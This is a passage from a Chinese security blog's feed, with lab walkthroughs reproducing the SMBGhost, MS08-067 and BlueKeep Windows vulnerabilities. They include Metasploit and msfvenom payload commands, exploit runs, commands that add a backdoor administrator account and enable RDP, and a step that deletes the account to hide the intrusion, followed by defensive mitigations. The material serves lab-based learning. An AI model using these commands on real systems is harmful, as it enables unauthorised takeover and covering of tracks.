3.0)服务远程代码执行漏洞(CVE-2020-0796)可被攻击者利用，实现无须权限即可执行远程代码，受攻击的目标系统只需开机在线即可能被入侵。该漏洞后果十分接近永恒之蓝系列，存在被WannaCry等勒索蠕虫利用的可能，攻击者可以构造特定的网页、压缩包、共享目录、Office文档等多种方式触发漏洞进行攻击，对存在该漏洞的Windows主机造成严重威胁。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796: 高危</span><br></pre></td></tr></table></figure><h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 10 Version 1903 x64 教育版（IP地址：192.168.193.142 / 192.168.193.143）</p><p>利用工具：</p><ul><li>MSF</li><li>Windows平台漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></li><li>Linux平台漏洞检测工具：<a href="https://github.com/joaozietolie/CVE-2020-0796-Checker">https://github.com/joaozietolie/CVE-2020-0796-Checker</a></li><li>本地EXP提权：<a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></li><li>POC蓝屏攻击： <a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></li><li>RCE poc：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></li></ul><h2 id="2-2-复现准备"><a href="#2-2-复现准备" class="headerlink" title="2.2 复现准备"></a>2.2 复现准备</h2><p>检查靶机中的445端口是否已经打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.2.1.png" class="" title="检查445端口"><p>如果没有打开，在Windows 防火墙中添加入站规则，开启端口445。</p><p>开启文件共享，否则Kali用nmap扫描时不会探测到靶机开启了445端口。</p><img src="/posts/df5ab46f/2.2.3.png" class="" title="开启文件共享"><img src="/posts/df5ab46f/2.2.2.png" class="" title="开启文件共享"><h2 id="2-3-复现过程"><a href="#2-3-复现过程" class="headerlink" title="2.3 复现过程"></a>2.3 复现过程</h2><h3 id="2-3-1-本地提权"><a href="#2-3-1-本地提权" class="headerlink" title="2.3.1 本地提权"></a>2.3.1 本地提权</h3><p>使用奇安信检测CVE-2020-0796漏洞工具，它适用于局域网批量检测，快速查找未打补丁的主机。</p><img src="/posts/df5ab46f/2.3.1.png" class="" title="检测漏洞"><p>使用本地EXP提权，下载下来是VS的一个工程文件，需要利用VS编译生成EXE文件。</p><p>查看当前用户，是普通用户，运行<code>cve-2020-0796-local.exe</code>后弹出另一个cmd窗口，在那个cmd窗口下的用户已经变成管理员了。</p><img src="/posts/df5ab46f/2.3.2.png" class="" title="本地提权"><h3 id="2-3-2-蓝屏攻击"><a href="#2-3-2-蓝屏攻击" class="headerlink" title="2.3.2 蓝屏攻击"></a>2.3.2 蓝屏攻击</h3><p>使用Linux平台CVE-2020-0796漏洞检测工具检查靶机是否存在该漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash CVE-2020-0796-Checker.sh -t 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.3.png" class="" title="检测漏洞"><p>确认存在该漏洞后，使用POC蓝屏攻击脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.5.png" class=""><p>靶机成功蓝屏：</p><img src="/posts/df5ab46f/2.3.4.png" class="" title="靶机蓝屏"><h3 id="2-3-3-远程登录"><a href="#2-3-3-远程登录" class="headerlink" title="2.3.3 远程登录"></a>2.3.3 远程登录</h3><p>RCE(remote command/code excute)，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>利用MSF生成Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=1234 -f py -o smb.py</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.7.png" class="" title="生成payload"><p>将Payload里的<code>buf</code>变量更名为<code>USER_PAYLOAD</code>，再将RCE poc中的<code>exploit.py</code>中的<code>USER_PAYLOAD</code>的值更换成Payload中的值。</p><p>给<code>exploit.py</code>增加执行权限，执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exploit.py</span><br><span class="line">python3 exploit.py -ip 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.6.png" class="" title="运行exploit"><p>利用MSF开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.193.143</span><br><span class="line">set lport 1234</span><br><span class="line">show options#查看还有没有参数没有设置的</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>结果运行到这里一直卡住：</p><img src="/posts/df5ab46f/2.3.8.png" class="" title="运行卡住"><p><strong>不知道什么问题，运行了很多次仍然卡在这。</strong></p><p>实现远程登录后再通过本地提权，可以拿到靶机的管理员权限。</p><h1 id="3-防御方法"><a href="#3-防御方法" class="headerlink" title="3. 防御方法"></a>3. 防御方法</h1><ul><li><p>安装补丁。</p></li><li><p>根据BleepComputer的说法，尽管微软并未共享禁用SMBv3压缩的官方方法，但是Foregenix Solutions架构师Niall Newman在分析了Srv2.sys文件后可以通过手动修改注册表，防止被黑客远程攻击。</p><ul><li><p>在注册表“HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters”建立一个名为<code>DisableCompression</code>的DWORD，值为1，禁止SMB的压缩功能。</p></li><li><p>或在管理员模式启动PowerShell，输入以下命令，执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure></li></ul></li><li><p>若无业务需要，在网络安全域边界防火墙封堵文件打印和共享端口TCP 135/139/445以缓解此问题。</p></li><li><p>可以通过安全厂商的漏洞检验和修复工具来检查是否存在漏洞和进行漏洞修复。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞描述&quot;&gt;&lt;a href=&quot;#1-1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞描述&quot;&gt;&lt;/a&gt;1.1 漏洞描述&lt;/h2&gt;&lt;p&gt;CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS08-067漏洞复现及防御机制</title>
    <link href="http://example.com/posts/fa648f2b.html"/>
    <id>http://example.com/posts/fa648f2b.html</id>
    <published>2022-05-25T01:02:44.954Z</published>
    <updated>2022-05-28T00:30:27.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</p><span id="more"></span><p>当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的<code>NetPathCanonicalize()</code>函数时触发的。<code>NetPathCanonicalize()</code>函数在远程访问其它主机时，会调用<code>NetpwPathCanonicalize()</code>函数，对远程访问的路径进行规范化，而在<code>NetpwPathCanonicalize()</code>函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p><p>所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。</p><p>在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【…\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。</p><p>详细请看：</p><p><a href="https://www.cnblogs.com/justforfun12/p/5239941.html">https://www.cnblogs.com/justforfun12/p/5239941.html</a> </p><p><a href="https://bbs.pediy.com/thread-251219.htm">https://bbs.pediy.com/thread-251219.htm</a></p><p><a href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>它影响了某些旧版本的Windows系统，包括：Windows 2000 、Windows XP 、Windows Server 2003。</p><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-常见的端口"><a href="#2-1-常见的端口" class="headerlink" title="2.1 常见的端口"></a>2.1 常见的端口</h2><img src="/posts/fa648f2b/2.1.1.jpg" class="" title="常见的端口"><p>黑客通过端口可以做信息收集、目标探测、服务判断、系统判断、角色分析。</p><h2 id="2-2-445端口"><a href="#2-2-445端口" class="headerlink" title="2.2 445端口"></a>2.2 445端口</h2><p>135、137、138、139和445端口都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。</p><p>445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！</p><p>总之，公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest 帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。</p><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows Server 2003  x86 企业版（IP地址：192.168.193.132）</p><p>利用工具：MSF</p><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>打开Windows Server 2003，确定445端口开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/2.2.1.png" class="" title="查看是否开启445端口"><p>关闭Win 2003系统的防火墙：</p><img src="/posts/fa648f2b/2.2.2.png" class="" title="关闭系统防火墙"><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>利用nmap扫描靶机的端口及确认该漏洞是否存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -p 445 --script smb-vuln-ms08-067 192.168.193.132 --open</span><br></pre></td></tr></table></figure><ul><li>-n：不要进行DNS解析</li><li>-p：后接端口号</li><li>—script：使用脚本进行扫描</li><li>—open：仅显示打开（或可能打开）的端口</li></ul><p>nmap漏扫脚本目录默认为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示漏洞存在且可以利用。</p><img src="/posts/fa648f2b/3.3.1.png" class="" title="扫描目标靶机的端口及确认该漏洞是否存在"><p>当然，我们一开始肯定不知道这么多信息，还不会用这么长的命令，那我们可以先确定靶机开放的端口和版本号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn 192.168.193.132</span><br></pre></td></tr></table></figure><ul><li>-sV：探测打开的端口以确定服务/版本信息</li><li>-Pn：将所有主机视为在线，也就是跳过主机发现</li></ul><img src="/posts/fa648f2b/3.3.2.png" class="" title="探测打开的端口以确定服务&#x2F;版本信息"><p>做安全行业的，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。要是实在不知道，那我们还可以查百度嘛。</p><p>进入MSF，搜索MS08-067，这些步骤都在 <a href="https://v5le0n9.github.io/posts/2d03ac3f.html">CVE-2019-0708</a> 都讲过，不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08-067</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.3.png" class="" title="搜索MS08-067"><p>查找到一个漏洞利用模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">show targets</span><br></pre></td></tr></table></figure><p>查看选项，缺少rhosts，所以要设置靶机IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.193.132 </span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.4.png" class="" title="设置靶机IP"><p>查看目标，找到与靶机匹配的信息。刚才我们已经用nmap -sV知道靶机是Windows Server 2003系统，但还是不知道具体信息（<strong>所以这种情况怎么才能知道具体信息？</strong>）。由于我知道靶机是Win 2003 SP2的，所以直接选目标74，如果实在没有更多信息那设置为自动目标(0)就好。</p><img src="/posts/fa648f2b/3.3.7.png" class="" title="设置target"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 74</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.5.png" class="" title="成功提权"><p>成功控制住靶机。我们可以用Linux或Windows窗口命令查看靶机的基本信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig#查看IP地址</span><br><span class="line">pwd#查看当前所在位置</span><br><span class="line">sysinfo#查看操作系统信息</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.9.png" class="" title="成功提权"><img src="/posts/fa648f2b/3.3.10.png" class="" title="成功提权"><p>后来做了set target 0的实验，MSF会自动检测系统版本并选择目标，但它默认选择English版本，这可能是没有成功建立会话的原因之一。</p><img src="/posts/fa648f2b/3.3.16.png" class="" title="提权失败"><p>此时将它修改为74也不行了，提示我们“这很可能意味着先前的攻击尝试导致服务崩溃”。</p><img src="/posts/fa648f2b/3.3.17.png" class="" title="提权失败"><p>如果多run几次还会导致Win 2003系统内存溢出错误。</p><img src="/posts/fa648f2b/3.3.18.png" class="" title="内存溢出错误"><p>这种情况好像只能等靶机重新开机，才能利用前几次攻击失败的经验继续渗透。</p><h3 id="3-3-1-创建文件"><a href="#3-3-1-创建文件" class="headerlink" title="3.3.1 创建文件"></a>3.3.1 创建文件</h3><p>尝试在靶机上创建文件夹和文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hacker</span><br><span class="line">cd hacker</span><br><span class="line">shell#进入靶机命令窗口</span><br><span class="line">echo v5le0n9&gt;test.txt</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.6.png" class="" title="在靶机创建目录"><img src="/posts/fa648f2b/3.3.8.png" class="" title="在靶机创建目录"><h3 id="3-3-2-创建用户"><a href="#3-3-2-创建用户" class="headerlink" title="3.3.2 创建用户"></a>3.3.2 创建用户</h3><p>Windows DOM用户常用命令如下：</p><ul><li><strong>net user abcd 1234 /add</strong><br>新建一个用户名为abcd，密码为1234的帐户，默认为user组成员</li><li><strong>net user abcd /del</strong><br>将用户名为abcd的用户删除</li><li><strong>net user abcd /active:no</strong><br>将用户名为abcd的用户禁用</li><li><strong>net user abcd /active:yes</strong><br>激活用户名为abcd的用户</li><li><strong>net user abcd</strong><br>查看用户名为abcd的用户的情况</li><li><strong>net localgroup administrators abcd /add</strong><br>将abcd账户给予管理员权限</li></ul><p>创建一个名为v5le0n9，密码为123456的普通用户，给予管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 123456 /add#增加普通用户</span><br><span class="line">net localgroup administrators v5le0n9 /add#提升管理员权限</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.11.png" class="" title="提升管理员权限"><p>在Win 2003中能看到新创建了一个用户v5le0n9。</p><img src="/posts/fa648f2b/3.3.13.png" class="" title="提升管理员权限"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat# 开启远程连接</span><br><span class="line">netstat -an# 查看网络端口</span><br><span class="line">rdesktop 192.168.193.132# 远程连接</span><br></pre></td></tr></table></figure><p>开启远程连接3389端口，使用Kali远程登录靶机。</p><img src="/posts/fa648f2b/3.3.12.png" class="" title="开启远程连接3389端口"><p>最后一定要把我们新建的用户名删除，假装没来过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 /del</span><br></pre></td></tr></table></figure><p>虽然不能远程登录了，但靶机<code>C:\Documents and Settings</code>目录下还是有v5le0n9文件夹，<strong>怎么删不掉呢？！</strong></p><img src="/posts/fa648f2b/3.3.15.png" class="" title="删除用户名"><img src="/posts/fa648f2b/3.3.14.png" class="" title="删除用户名"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>关闭相关端口、安装杀毒软件和补丁</li><li>在防火墙中进行流量监测，主要是针对数据包中存在的形如“\ ** \ … \ … \ *”这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞概述&quot;&gt;&lt;/a&gt;1.1 漏洞概述&lt;/h2&gt;&lt;p&gt;MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708漏洞复现及防御机制</title>
    <link href="http://example.com/posts/2d03ac3f.html"/>
    <id>http://example.com/posts/2d03ac3f.html</id>
    <published>2022-05-24T07:28:42.637Z</published>
    <updated>2022-05-28T01:02:02.226Z</updated>
    
    <content type="html"><![CDATA[<p>终于来到了这一步，你你你，就是我第一个复现的漏洞啦！CVE-2019-0708又称bluekeep。</p><span id="more"></span><h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的Windows。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。其方式与2017年的 WannaCry 恶意软件的传播方式类似，成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>存在漏洞的远程桌面服务器，在接收到特殊数据包时会释放一个内部信道 MS_T120 的控制结构体，但并未将指向该结构体的指针删除，而且在远程桌面连接结束之后还会调用 MS_T120 结构体内的一个函数指针，若攻击者可通过远程发送数据重新占据被释放的 MS_T120，并为结构体内的函数指针赋恰当的值，即可实现远程命令执行。</p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>该漏洞影响旧版本的Windows系统，包括：Windows 7 、 Windows Server 2008 R2 、 Windows Server 2008 、Windows 2003 、 Windows XP。</p><p>Windows 8 和 Windows 10及之后版本不受此漏洞影响。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>CVE-2019-0708漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击。如果被攻击者利用，会导致服务器被入侵，中病毒，像 WannaCry 永恒之蓝漏洞一样大规模的感染。若要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送经特殊设计的请求。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-0708: 高危</span><br></pre></td></tr></table></figure><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-RDP协议"><a href="#2-1-RDP协议" class="headerlink" title="2.1 RDP协议"></a>2.1 RDP协议</h2><p>远程显示协议(Remote Display Protocol，RDP)，提供了客户和服务器之间的连接。</p><p>RDP是微软终端服务应用的协议，服务端基于Win 2000 / Win NT。协议基于T.128（T.120协议族）提供多通道通信。在客户端支持多种资源缓冲和图片数据的压缩处理，运用RDP协议的虚拟化平台有VMware、Microsoft等。</p><p>终端服务使任何一台有权限的终端机，用已知的账号登录服务器，可以使用账号内的资源，包括软件，硬件资源；同时，在协议升级后，客户端连接后可以使用本地的资源，包括本地打印机、声音本地回放，本地磁盘资源和本地硬件接口。所有的计算都在服务器端进行，客户端只需要处理网络连接、接收数据、界面显示和设备数据输出。</p><h2 id="2-2-专业术语"><a href="#2-2-专业术语" class="headerlink" title="2.2 专业术语"></a>2.2 专业术语</h2><ul><li>POC(Proof of Concept)：观点证明，用来证明漏洞存在的。简单来说是用来证明一段漏洞的代码，它是无害的。</li><li>EXP(Exploit)：漏洞利用，是指利用系统漏洞进行攻击的动作。</li><li>Payload：有效载荷，指的是Exploit执行成功之后，在系统中进行恶意操作的代码或者指令。</li><li>Shellcode：简单翻译就是shell代码，是payload的一种，因为建立正反shell而得名。Shellcode是一段利用软件漏洞执行的代码，Shellcode为16进制的机器码， 可在寄存器eip溢出后，塞入一段让CPU执行的Shellcode机器码，让电脑可以执行攻击者的任意指令。</li></ul><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 7  x86 旗舰版（IP地址：192.168.193.140）、Windows 7  x64 企业版（IP地址：192.168.193.141）</p><p>利用工具：</p><ul><li>MSF</li><li>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></li></ul><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>在靶机中设置远程桌面连接：</p><img src="/posts/2d03ac3f/2.2.1.png" class="" title="设置远程桌面连接"><p>开启公用文件夹共享：</p><img src="/posts/2d03ac3f/2.2.2.png" class="" title="开启公用文件夹共享"><p>在Windows 防火墙开启3389端口：</p><img src="/posts/2d03ac3f/2.2.3.png" class="" title="开启3389端口"><p>在攻击机中更新应用，安装MSF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><p>有关MSF的知识可以看<a href="https://blog.csdn.net/weixin_45677145/article/details/111540117">MSF详解</a>，Metasploit 是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>扫描靶机IP或扫描内网的存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.193.140</span><br><span class="line">nmap 192.168.193.0/24</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.4.png" class="" title="扫描靶机是否开启3389端口"><p>发现靶机开启了3389端口，猜测可以利用CVE-2019-0708进行攻击。进入MSF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.5.png" class="" title="进入MSF"><p>在MSF中搜索有关CVE-2019-0708的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search cve-2019-0708</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.7.png" class="" title="启用模块"><p>得到两个模块，一个是辅助模块，用来扫描靶机是否存在该漏洞且可利用；另一个是漏洞利用模块，用来攻击靶机。</p><p>先利用辅助模块对靶机进行扫描，查看相关信息和设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.6.png" class="" title="启用模块"><p>其中还有一个rhosts参数还没进行设置，将rhosts设置为靶机IP，进行检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 